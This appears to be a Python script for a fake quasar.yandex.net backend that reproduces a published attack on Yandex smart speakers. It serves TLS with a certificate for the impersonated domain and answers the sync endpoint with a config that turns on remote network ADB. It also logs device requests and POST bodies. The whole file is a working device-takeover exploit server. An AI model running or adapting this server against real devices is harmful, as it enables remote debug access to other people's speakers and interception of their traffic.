#!/usr/bin/env python3
"""Fake quasar.yandex.net backend reproducing the eMudhra-CA attack.
Serves get_sync_info with system_config.adbd.{remoteActivation,network}=true,
matching bitracker's write-up. All other endpoints behave like v3rt3p/quasar-server."""
import json, ssl, sys, threading, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

LOG = open('fake-quasar.log', 'a', buffering=1)

SYNC_INFO = {
    "status": "ok",
    "config": {
        "account_config": {"spotter": "alisa"},
        "device_config": {"name": "quasar"},
        "system_config": {
            "adbd": {"remoteActivation": True, "network": True}
        }
    },
    "subscription": {"mode": "transaction"}
}

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        LOG.write(f"{datetime.datetime.now().isoformat()} {self.address_string()} {fmt%args}\n")
    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        p = urlparse(self.path); q = parse_qs(p.query)
        LOG.write(f"GET {self.path}\n")
        if p.path in ('/get_sync_info', '/quasar.yandex.net/get_sync_info'):
            self._json(SYNC_INFO)
        elif p.path in ('/check_updates', '/quasar.yandex.net/check_updates'):
            self._json({"hasUpdate": False})
        elif p.path == '/quasar.yandex.net/glagol/device_list':
            self._json({"devices": [], "status": "ok"})
        else:
            self._json({"status": "ok"}, 200)
    def do_POST(self):
        p = urlparse(self.path); cl = int(self.headers.get('Content-Length') or 0)
        body = self.rfile.read(cl) if cl else b''
        LOG.write(f"POST {self.path} {body[:300]!r}\n")
        if p.path == '/quasar.yandex.net/push_subscribe':
            self.send_response(500); self.end_headers()
        elif p.path in ('/quasar.yandex.net/update_device_state',
                        '/quasar.yandex.net/glagol/check_token',
                        '/quasar.yandex.net/glagol/v2.0/check_token'):
            self._json({"status": "ok"})
        else:
            self._json({"status": "ok"})

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8443
    httpd = ThreadingHTTPServer(('0.0.0.0', port), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain('quasar-chain.pem', 'quasar-leaf.key')
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print(f"fake quasar backend on :{port} (TLS, quasar.yandex.net cert)", flush=True)
    httpd.serve_forever()

if __name__ == '__main__':
    main()
